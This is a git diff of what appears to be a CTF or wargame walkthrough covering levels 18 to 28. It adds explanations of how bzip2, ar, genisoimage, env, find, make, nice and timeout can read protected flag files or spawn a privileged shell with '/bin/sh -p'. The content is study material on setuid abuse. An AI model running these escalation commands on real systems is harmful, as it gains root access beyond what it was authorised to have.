@@ -86,6 +86,8 @@ level 18: **bzip2**
 
 ```shell
 bzip2 -c file_name | bzip2 -d
+#-c:results are sent to standard output.
+#-d:perform the decompression
 ```
 
 level 19: **zip**
@@ -105,7 +107,7 @@ cat flag.tar.gz
 level 21: **ar** ---> to create or modify a backup file
 
 ```shell
-ar rv flag.back flag
+ar rv flag.back flag#-r:The file is inserted into the backup file	v:show the detail information
 cat flag.back
 ```
 
@@ -123,6 +125,7 @@ the file is parsed, and some of its content is disclosed by the error messages, 
 
 ```shell
 genisoimage -sort flag
+#-sort:to re-ordering the contents of the ISO
 ```
 
 **execute other commands**
@@ -133,11 +136,38 @@ level 24: **env**--->show environment variables that already exists in the syste
 
 ```shell
 env /bin/sh -p #getshell
+#-p:/bin/sh either became bash or stayed dash which got an additional flag -p mimicking bash's behaviour, bash requires the -p flag to not drop setuid privilege.
 ```
 
 level 25: **find**--->used to find files in the specified directory
 
 ```shell
 find . -exec /bin/sh -p \;
+```
+
+`exec command in Linux is used to execute a command from the bash itself. This command does not create a new process it just replaces the bash with the command to be executed. If the exec command is successful, it does not return to the calling process.`
+
+level 26: **make**---> compile and install tools, manage project compilation issues
+
+```shell
+make -s --eval=$'x:\n\t-'"/bin/sh -p"
+#-s:--silent don't echo recipes		--eval=STRING:evaluate STRING as a makefile statement
+```
+
+level 27: **nice**
+
+```shell
+nice /bin/sh -p
+```
+
+> **Usage: nice [OPTION] [COMMAND [ARG]...]**
+> Run COMMAND with an adjusted niceness, which affects process scheduling.With no COMMAND, print the current niceness.  Niceness values range from -20 (most favorable to the process) to 19 (least favorable to the process).
+
+level 28: **timeout**---> start COMMAND, and kill it if still running after DURATION.
+
+**Usage: timeout [OPTION] DURATION COMMAND [ARG]**
+
+```shell
+timeout 7d /bin/sh -p
 ```
 
